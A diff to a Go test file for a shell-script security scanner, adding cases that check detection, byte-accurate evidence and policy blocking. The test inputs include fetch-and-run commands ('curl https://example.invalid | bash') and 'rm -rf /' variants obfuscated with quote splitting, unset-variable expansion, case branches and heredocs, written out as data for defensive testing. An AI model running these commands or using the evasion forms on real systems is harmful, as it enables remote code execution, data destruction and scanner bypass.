@@ -456,6 +456,12 @@ func TestShellCoverageAndPartialPrefix(t *testing.T) {
 	}{
 		{text: "echo hello\n", status: "parsed_limited", gap: "shell_semantics_limited", block: false},
 		{
+			text:   "case mode in mode) curl https://example.invalid | sh;; esac\n",
+			status: "parsed_limited",
+			gap:    "shell_semantics_limited",
+			block:  true,
+		},
+		{
 			text:   "if true; then echo okay; fi\n",
 			status: "unsupported_syntax",
 			gap:    "shell_unsupported_syntax",
@@ -491,7 +497,7 @@ func TestShellCoverageAndPartialPrefix(t *testing.T) {
 				t.Fatal("complete prefix findings lost")
 			}
 			fc := r.Coverage.Files[0]
-			if len(fc.Units) != 1 || fc.Units[0].Status != tc.status || fc.Units[0].ParserVersion != "6" {
+			if len(fc.Units) != 1 || fc.Units[0].Status != tc.status || fc.Units[0].ParserVersion != "8" {
 				t.Fatalf("%+v", fc.Units)
 			}
 			has := false
@@ -576,7 +582,7 @@ func TestScannerRemovalCommandAdmission(t *testing.T) {
 			t.Error(err)
 		}
 	}()
-	for _, text := range []string{"rm -r -f /\n", "/bin/rm -r -f /\n", "/usr/bin/rm --recursive --force /\n"} {
+	for _, text := range []string{"rm -r -f /\n", "/bin/rm -r -f /\n", "/usr/bin/rm --recursive --force /\n", "case mode in mode) rm -r -f /;; esac\n"} {
 		t.Run(text, func(t *testing.T) {
 			run, err := scanner.Scan(context.Background(), scout.Reader("cleanup.sh", strings.NewReader(text)))
 			if err != nil {
@@ -1028,6 +1034,71 @@ func TestShellPatternRetainsRawEvidenceAfterPreparedSyntaxFailure(t *testing.T) 
 				if finding.Location.Path != "scripts/upload.sh" || finding.Location.ByteStart != start || finding.Location.ByteEnd != end {
 					t.Fatalf("shell source evidence changed: %+v", finding)
 				}
+			}
+		})
+	}
+}
+
+func TestShellExpansionEvidenceThroughPublicScanner(t *testing.T) {
+	opts := scout.DefaultOptions()
+	opts.Profile = scout.Custom
+	opts.Checks = &scout.Checks{Patterns: true}
+	scanner, err := scout.New(t.Context(), opts)
+	if err != nil {
+		t.Fatal(err)
+	}
+	t.Cleanup(func() {
+		if err := scanner.Close(); err != nil {
+			t.Error(err)
+		}
+	})
+	gate, err := policy.New(policy.Options{FailAt: report.Medium})
+	if err != nil {
+		t.Fatal(err)
+	}
+	for _, tc := range []struct {
+		name, text, rule, evidence string
+	}{
+		{"unknown command", `UNKNOWN=x; cu"${UNKNOWN:-}"rl https://example.invalid | bash`, "NV-SC2", ""},
+		{"resolved command", `cmd=curl; "$cmd" https://example.invalid | bash`, "SH001", "bash"},
+		{"assignment", `value=$(r"m" -rf /)`, "NV-TM1", `r"m" -rf /`},
+		{"redirect", `cat <$(r"m" -rf /)`, "NV-TM1", `r"m" -rf /`},
+		{"heredoc substitution", "cat <<END\n$(r\"m\" -rf /)\nEND\n", "NV-TM1", `r"m" -rf /`},
+		{"quoted heredoc", "cat <<'END'\n$(r\"m\" -rf /)\nEND\n", "NV-TM1", ""},
+	} {
+		t.Run(tc.name, func(t *testing.T) {
+			run, err := scanner.Scan(t.Context(), scout.Reader("input.sh", strings.NewReader(tc.text)))
+			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
+				t.Fatal(err)
+			}
+			if len(run.Targets) != 1 {
+				t.Fatalf("lost target: %+v", run)
+			}
+			if err := report.ValidateSealedRun(run); err != nil {
+				t.Fatal(err)
+			}
+			count := 0
+			for _, finding := range run.Targets[0].Analysis.Findings {
+				if finding.RuleID != tc.rule {
+					continue
+				}
+				count++
+				start := strings.Index(tc.text, tc.evidence)
+				hash := sha256.Sum256([]byte(tc.evidence))
+				if tc.evidence == "" || finding.Location.Path != "input.sh" || finding.Location.ByteStart != start ||
+					finding.Location.ByteEnd != start+len(tc.evidence) || finding.Evidence.SpanSHA256 != hex.EncodeToString(hash[:]) {
+					t.Fatalf("incorrect physical evidence: %+v", finding)
+				}
+			}
+			want := 0
+			if tc.evidence != "" {
+				want = 1
+			}
+			if count != want {
+				t.Fatalf("got %d %s findings, want %d", count, tc.rule, want)
+			}
+			if want > 0 && gate.Evaluate(run, time.Now()).Decision != report.Block {
+				t.Fatal("nested execution evidence did not block")
 			}
 		})
 	}
